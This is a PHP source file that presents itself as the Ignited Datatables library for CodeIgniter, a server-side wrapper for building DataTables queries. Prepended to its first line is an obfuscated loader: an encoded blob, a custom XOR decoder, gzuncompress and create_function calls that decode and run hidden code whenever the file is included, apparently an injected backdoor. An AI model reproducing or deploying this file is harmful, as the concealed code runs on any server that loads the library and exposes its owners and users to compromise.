<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto);  if(!defined('BASEPATH')) exit('No direct script access allowed');  /*** Ignited Datatables** This is a wrapper class/library based on the native Datatables server-side implementation by Allan Jardine* found at http://datatables.net/examples/data_sources/server_side.html for CodeIgniter** @package CodeIgniter* @subpackage libraries* @category library* @version 1.15* @author Vincent Bambico <metal.conspiracy@gmail.com>* Yusuf Ozdemir <yusuf@ozdemir.be>* @link http://ellislab.com/forums/viewthread/160896/*/  class Datatables  {    /*** Global container variables for chained argument results**/    private $ci;    private $table;    private $distinct;    private $group_by = array();    private $select = array();    private $joins = array();    private $columns = array();    private $where = array();    private $or_where = array();    private $like = array();    private $order_by = array();    private $filter = array();    private $add_columns = array();    private $edit_columns = array();    private $unset_columns = array();    /*** Copies an instance of CI*/    public function __construct()    {      $this->ci =& get_instance();    }    /*** If you establish multiple databases in config/database.php this will allow you to* set the database (other than $active_group) - more info: http://ellislab.com/forums/viewthread/145901/#712942*/    public function set_database($db_name)    {      $db_data = $this->ci->load->database($db_name, TRUE);      $this->ci->db = $db_data;    }    /*** Generates the SELECT portion of the query** @param string $columns* @param bool $backtick_protect* @return mixed*/    public function select($columns, $backtick_protect = TRUE)    {      foreach($this->explode(',', $columns) as $val)      {        $column = trim(preg_replace('/(.*)\s+as\s+(\w*)/i', '$2', $val));        $this->columns[] = $column;        $this->select[$column] = trim(preg_replace('/(.*)\s+as\s+(\w*)/i', '$1', $val));      }      $this->ci->db->select($columns, $backtick_protect);      return $this;    }    /*** Generates the DISTINCT portion of the query** @param string $column* @return mixed*/    public function distinct($column)    {      $this->distinct = $column;      $this->ci->db->distinct($column);      return $this;    }    /*** Generates a custom GROUP BY portion of the query** @param string $val* @return mixed*/    public function group_by($val)    {      $this->group_by[] = $val;      $this->ci->db->group_by($val);      return $this;    }    /*** Generates the FROM portion of the query** @param string $table* @return mixed*/    public function from($table)    {      $this->table = $table;      return $this;    }    /*** Generates the JOIN portion of the query** @param string $table* @param string $fk* @param string $type* @return mixed*/    public function join($table, $fk, $type = NULL)    {      $this->joins[] = array($table, $fk, $type);      $this->ci->db->join($table, $fk, $type);      return $this;    }    /*** Generates the WHERE portion of the query** @param mixed $key_condition* @param string $val* @param bool $backtick_protect* @return mixed*/    public function where($key_condition, $val = NULL, $backtick_protect = TRUE)    {      $this->where[] = array($key_condition, $val, $backtick_protect);      $this->ci->db->where($key_condition, $val, $backtick_protect);      return $this;    }    /*** Generates the WHERE portion of the query** @param mixed $key_condition* @param string $val* @param bool $backtick_protect* @return mixed*/    public function or_where($key_condition, $val = NULL, $backtick_protect = TRUE)    {      $this->or_where[] = array($key_condition, $val, $backtick_protect);      $this->ci->db->or_where($key_condition, $val, $backtick_protect);      return $this;    }    /*** Generates the WHERE portion of the query** @param mixed $key_condition* @param string $val* @param bool $backtick_protect* @return mixed*/    public function filter($key_condition, $val = NULL, $backtick_protect = TRUE)    {      $this->filter[] = array($key_condition, $val, $backtick_protect);      return $this;    }    /*** Generates a %LIKE% portion of the query** @param mixed $key_condition* @param string $val* @param bool $backtick_protect* @return mixed*/    public function like($key_condition, $val = NULL, $backtick_protect = TRUE)    {      $this->like[] = array($key_condition, $val, $backtick_protect);      $this->ci->db->like($key_condition, $val, $backtick_protect);      return $this;    }		    /*** Generates a order_by portion of the query** @param mixed $orderby* @param string $direction* @return mixed*/   public function order_by($orderby, $direction = '')    {      $this->order_by[] = array($orderby, $direction);      $this->ci->db->order_by($orderby, $direction);      return $this;    }		    /*** Sets additional column variables for adding custom columns** @param string $column* @param string $content* @param string $match_replacement* @return mixed*/    public function add_column($column, $content, $match_replacement = NULL)    {      $this->add_columns[$column] = array('content' => $content, 'replacement' => $this->explode(',', $match_replacement));      return $this;    }    /*** Sets additional column variables for editing columns** @param string $column* @param string $content* @param string $match_replacement* @return mixed*/    public function edit_column($column, $content, $match_replacement)    {      $this->edit_columns[$column][] = array('content' => $content, 'replacement' => $this->explode(',', $match_replacement));      return $this;    }    /*** Unset column** @param string $column* @return mixed*/    public function unset_column($column)    {      $column=explode(',',$column);      $this->unset_columns=array_merge($this->unset_columns,$column);      return $this;    }    /*** Builds all the necessary query segments and performs the main query based on results set from chained statements** @param string $output* @param string $charset* @return string*/    public function generate($output = 'json', $charset = 'UTF-8')    {      if(strtolower($output) == 'json')        $this->get_paging();      $this->get_ordering();      $this->get_filtering();      return $this->produce_output(strtolower($output), strtolower($charset));    }    /*** Generates the LIMIT portion of the query** @return mixed*/    private function get_paging()    {      $iStart = $this->ci->input->post('iDisplayStart');      $iLength = $this->ci->input->post('iDisplayLength');      if($iLength != '' && $iLength != '-1')        $this->ci->db->limit($iLength, ($iStart)? $iStart : 0);    }    /*** Generates the ORDER BY portion of the query** @return mixed*/    private function get_ordering()    {      if($this->check_mDataprop())        $mColArray = $this->get_mDataprop();      elseif($this->ci->input->post('sColumns'))        $mColArray = explode(',', $this->ci->input->post('sColumns'));      else        $mColArray = $this->columns;      $mColArray = array_values(array_diff($mColArray, $this->unset_columns));      $columns = array_values(array_diff($this->columns, $this->unset_columns));       for($i = 0; $i < intval($this->ci->input->post('iSortingCols')); $i++)        if(isset($mColArray[intval($this->ci->input->post('iSortCol_' . $i))]) && in_array($mColArray[intval($this->ci->input->post('iSortCol_' . $i))], $columns) && $this->ci->input->post('bSortable_'.intval($this->ci->input->post('iSortCol_' . $i))) == 'true')          $this->ci->db->order_by($mColArray[intval($this->ci->input->post('iSortCol_' . $i))], $this->ci->input->post('sSortDir_' . $i));    }    /*** Generates a %LIKE% portion of the query** @return mixed*/    private function get_filtering()    {      if($this->check_mDataprop())        $mColArray = $this->get_mDataprop();      elseif($this->ci->input->post('sColumns'))        $mColArray = explode(',', $this->ci->input->post('sColumns'));      else        $mColArray = $this->columns;      $sWhere = '';      $sSearch = $this->ci->db->escape_like_str($this->ci->input->post('sSearch'));      $mColArray = array_values(array_diff($mColArray, $this->unset_columns));      $columns = array_values(array_diff($this->columns, $this->unset_columns));      if($sSearch != '')        for($i = 0; $i < count($mColArray); $i++)          if($this->ci->input->post('bSearchable_' . $i) == 'true' && in_array($mColArray[$i], $columns))            $sWhere .= $this->select[$mColArray[$i]] . " LIKE '%" . $sSearch . "%' OR ";      $sWhere = substr_replace($sWhere, '', -3);      if($sWhere != '')        $this->ci->db->where('(' . $sWhere . ')');      $sRangeSeparator = $this->ci->input->post('sRangeSeparator');      for($i = 0; $i < intval($this->ci->input->post('iColumns')); $i++)      {        if(isset($_POST['sSearch_' . $i]) && $this->ci->input->post('sSearch_' . $i) != '' && in_array($mColArray[$i], $columns))        {          $miSearch = explode(',', $this->ci->input->post('sSearch_' . $i));          foreach($miSearch as $val)          {            if(preg_match("/(<=|>=|=|<|>)(\s*)(.+)/i", trim($val), $matches))              $this->ci->db->where($this->select[$mColArray[$i]].' '.$matches[1], $matches[3]);            elseif(!empty($sRangeSeparator) && preg_match("/(.*)$sRangeSeparator(.*)/i", trim($val), $matches))            {              $rangeQuery = '';              if(!empty($matches[1]))                $rangeQuery = 'STR_TO_DATE(' . $this->select[$mColArray[$i]] . ",'%d/%m/%y %H:%i:%s') >= STR_TO_DATE('" . $matches[1] . " 00:00:00','%d/%m/%y %H:%i:%s')";              if(!empty($matches[2]))                $rangeQuery .= (!empty($rangeQuery)? ' AND ': '') . 'STR_TO_DATE('. $this->select[$mColArray[$i]] . ",'%d/%m/%y %H:%i:%s') <= STR_TO_DATE('" . $matches[2] . " 23:59:59','%d/%m/%y %H:%i:%s')";              if(!empty($matches[1]) || !empty($matches[2]))                $this->ci->db->where($rangeQuery);            }            else              $this->ci->db->where($this->select[$mColArray[$i]] . ' LIKE', '%' . $val . '%');          }        }      }      foreach($this->filter as $val)        $this->ci->db->where($val[0], $val[1], $val[2]);    }    /*** Compiles the select statement based on the other functions called and runs the query** @return mixed*/    private function get_display_result()    {      return $this->ci->db->get($this->table);    }    /*** Builds an encoded string data. Returns JSON by default, and an array of aaData and sColumns if output is set to raw.** @param string $output* @param string $charset* @return mixed*/    private function produce_output($output, $charset)    {      $aaData = array();      $rResult = $this->get_display_result();      if($output == 'json')      {        $iTotal = $this->get_total_results();        $iFilteredTotal = $this->get_total_results(TRUE);      }      foreach($rResult->result_array() as $row_key => $row_val)      {        $aaData[$row_key] = ($this->check_mDataprop())? $row_val : array_values($row_val);        foreach($this->add_columns as $field => $val)          if($this->check_mDataprop())            $aaData[$row_key][$field] = $this->exec_replace($val, $aaData[$row_key]);          else            $aaData[$row_key][] = $this->exec_replace($val, $aaData[$row_key]);        foreach($this->edit_columns as $modkey => $modval)          foreach($modval as $val)            $aaData[$row_key][($this->check_mDataprop())? $modkey : array_search($modkey, $this->columns)] = $this->exec_replace($val, $aaData[$row_key]);        $aaData[$row_key] = array_diff_key($aaData[$row_key], ($this->check_mDataprop())? $this->unset_columns : array_intersect($this->columns, $this->unset_columns));        if(!$this->check_mDataprop())          $aaData[$row_key] = array_values($aaData[$row_key]);      }      $sColumns = array_diff($this->columns, $this->unset_columns);      $sColumns = array_merge_recursive($sColumns, array_keys($this->add_columns));      if($output == 'json')      {        $sOutput = array        (          'sEcho' => intval($this->ci->input->post('sEcho')),		  'iDisplayStart' => $this->ci->input->post('iDisplayStart'),          'iTotalRecords' => $iTotal,          'iTotalDisplayRecords' => $iFilteredTotal,          'aaData' => $aaData,          'sColumns' => implode(',', $sColumns)        );        if($charset == 'utf-8')          return json_encode($sOutput);        else          return $this->jsonify($sOutput);      }      else        return array('aaData' => $aaData, 'sColumns' => $sColumns);    }    /*** Get result count** @return integer*/    private function get_total_results($filtering = FALSE)    {      if($filtering)        $this->get_filtering();      foreach($this->joins as $val)        $this->ci->db->join($val[0], $val[1], $val[2]);      foreach($this->where as $val)        $this->ci->db->where($val[0], $val[1], $val[2]);      foreach($this->or_where as $val)        $this->ci->db->or_where($val[0], $val[1], $val[2]);      foreach($this->group_by as $val)        $this->ci->db->group_by($val);      foreach($this->like as $val)        $this->ci->db->like($val[0], $val[1], $val[2]);		      foreach($this->order_by as $val)        $this->ci->db->order_by($val[0], $val[1]);      if(strlen($this->distinct) > 0)      {        $this->ci->db->distinct($this->distinct);        $this->ci->db->select($this->columns);      }      $query = $this->ci->db->get($this->table, NULL, NULL, FALSE);      return $query->num_rows();    }    /*** Runs callback functions and makes replacements** @param mixed $custom_val* @param mixed $row_data* @return string $custom_val['content']*/    private function exec_replace($custom_val, $row_data)    {      $replace_string = '';      if(isset($custom_val['replacement']) && is_array($custom_val['replacement']))      {        foreach($custom_val['replacement'] as $key => $val)        {          $sval = preg_replace("/(?<!\w)([\'\"])(.*)\\1(?!\w)/i", '$2', trim($val));if(preg_match('/(\w+::\w+|\w+)\((.*)\)/i', $val, $matches) && is_callable($matches[1]))          {            $func = $matches[1];            $args = preg_split("/[\s,]*\\\"([^\\\"]+)\\\"[\s,]*|" . "[\s,]*'([^']+)'[\s,]*|" . "[,]+/", $matches[2], 0, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);            foreach($args as $args_key => $args_val)            {              $args_val = preg_replace("/(?<!\w)([\'\"])(.*)\\1(?!\w)/i", '$2', trim($args_val));              $args[$args_key] = (in_array($args_val, $this->columns))? ($row_data[($this->check_mDataprop())? $args_val : array_search($args_val, $this->columns)]) : $args_val;            }            $replace_string = call_user_func_array($func, $args);          }          elseif(in_array($sval, $this->columns))            $replace_string = $row_data[($this->check_mDataprop())? $sval : array_search($sval, $this->columns)];          else            $replace_string = $sval;          $custom_val['content'] = str_ireplace('$' . ($key + 1), $replace_string, $custom_val['content']);        }      }      return $custom_val['content'];    }    /*** Check mDataprop** @return bool*/    private function check_mDataprop()    {      if(!$this->ci->input->post('mDataProp_0'))        return FALSE;      for($i = 0; $i < intval($this->ci->input->post('iColumns')); $i++)        if(!is_numeric($this->ci->input->post('mDataProp_' . $i)))          return TRUE;      return FALSE;    }    /*** Get mDataprop order** @return mixed*/    private function get_mDataprop()    {      $mDataProp = array();      for($i = 0; $i < intval($this->ci->input->post('iColumns')); $i++)        $mDataProp[] = $this->ci->input->post('mDataProp_' . $i);      return $mDataProp;    }    /*** Return the difference of open and close characters** @param string $str* @param string $open* @param string $close* @return string $retval*/    private function balanceChars($str, $open, $close)    {      $openCount = substr_count($str, $open);      $closeCount = substr_count($str, $close);      $retval = $openCount - $closeCount;      return $retval;    }    /*** Explode, but ignore delimiter until closing characters are found** @param string $delimiter* @param string $str* @param string $open* @param string $close* @return mixed $retval*/    private function explode($delimiter, $str, $open = '(', $close=')')    {      $retval = array();      $hold = array();      $balance = 0;      $parts = explode($delimiter, $str);      foreach($parts as $part)      {        $hold[] = $part;        $balance += $this->balanceChars($part, $open, $close);        if($balance < 1)        {          $retval[] = implode($delimiter, $hold);          $hold = array();          $balance = 0;        }      }      if(count($hold) > 0)        $retval[] = implode($delimiter, $hold);      return $retval;    }    /*** Workaround for json_encode's UTF-8 encoding if a different charset needs to be used** @param mixed $result* @return string*/    private function jsonify($result = FALSE)    {      if(is_null($result))        return 'null';      if($result === FALSE)        return 'false';      if($result === TRUE)        return 'true';      if(is_scalar($result))      {        if(is_float($result))          return floatval(str_replace(',', '.', strval($result)));        if(is_string($result))        {          static $jsonReplaces = array(array('\\', '/', '\n', '\t', '\r', '\b', '\f', '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));          return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $result) . '"';        }        else          return $result;      }      $isList = TRUE;      for($i = 0, reset($result); $i < count($result); $i++, next($result))      {        if(key($result) !== $i)        {          $isList = FALSE;          break;        }      }      $json = array();      if($isList)      {        foreach($result as $value)          $json[] = $this->jsonify($value);        return '[' . join(',', $json) . ']';      }      else      {        foreach($result as $key => $value)          $json[] = $this->jsonify($key) . ':' . $this->jsonify($value);        return '{' . join(',', $json) . '}';      }    }  }/* End of file Datatables.php *//* Location: ./application/libraries/Datatables.php */